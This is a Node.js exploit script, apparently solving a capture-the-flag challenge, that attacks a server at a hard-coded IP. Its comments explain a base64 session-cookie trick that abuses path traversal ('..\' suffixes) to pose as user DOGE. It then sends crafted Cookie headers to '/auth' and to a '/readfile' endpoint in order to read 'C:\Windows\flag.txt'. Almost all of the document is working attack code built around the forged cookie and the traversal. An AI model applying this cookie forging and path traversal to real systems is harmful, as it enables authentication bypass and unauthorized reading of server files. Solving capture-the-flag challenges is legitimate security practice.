var http = require('http');
var fs = require('fs');
var path = require('path');
var util = require('util');
var url = require('url');
var DSON = require('dogeon');
var crypto = require('crypto');

// DOGE and file is appear in \\tmp\\sessions\\
// we can abuse the file existance by appending some base64 chars and add suffix ..\\ into it.
// the base64 will decode by the server and become DOGE///\..\, the split("/") function will get the DOGE as user name.

// Test file path vulnerability
if(fs.existsSync('\\tmp\\sessions\\RE9HRS8vL1wuLlw=\\..\\')){
	console.log("path");
}

// Test auth if works or not
const get_options = {
  host: '116.202.161.100',
  port: 8124,
  path: '/auth',
  method: 'GET',
  headers: {
 	  'Cookie': 'session=RE9HRS8vXC4usXA==\\..\\',
    'Content-Type': 'application/dson',
    // 'Content-Length': Buffer.byteLength(post_data)
  }
};

// Get flag
const get_options_2 = {
  host: '116.202.161.100',
  port: 8124,
  path: '/readfile?filename=C:\\Windows\\flag.txt',
  method: 'GET',
  headers: {
 	  'Cookie': 'session=RE9HRS8vXC4uXA==\\..\\',
    'Content-Type': 'application/dson',
      // 'Content-Length': Buffer.byteLength(post_data),
  }
};

const req = http.request(get_options_2, function(res) {
// res.setEncoding('utf8');
//console.log(res.headers);

  res.on('data', function (chunk) {
      console.log('Response: ' + chunk);
  });
});

// const post_data = DSON.stringify({
//   'user': 'DOGE',
//   'password': '123'
// });
// req.write(post_data);

req.on('error', error => {
	console.error(error);
});

req.end();